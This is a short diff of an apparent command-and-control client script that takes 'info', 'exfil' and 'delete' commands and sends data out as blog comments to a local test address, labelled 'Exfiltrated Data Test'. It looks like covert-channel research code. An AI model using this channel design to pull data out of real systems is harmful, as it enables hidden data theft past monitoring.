@@ -7,9 +7,8 @@ import tools
 
 client_id = sys.argv[1]
 random.seed(int(datetime.datetime.now().timestamp()) + int(client_id))
-
+is_debug = True if len(sys.argv) > 2 and sys.argv[2] == "-v" else False
 sender = generate_random_sender()
-commands = [ "info", "exfil", "delete" ]
 
 channel = Channel()
 channel.target_blog = "http://127.0.0.3/"
@@ -42,6 +41,7 @@ while(True):
     if command_to_execute == "info":
         log_print("[INFO] client: Got info command. Sending data...", 1)
         comment = Comment()
+        comment.sender = sender
         comment.comment_id = generate_random_string(10)
         comment.comment = comment.comment_id + ": Exfiltrated Data Test"
         send_data(channel, comment, btm_send_config)
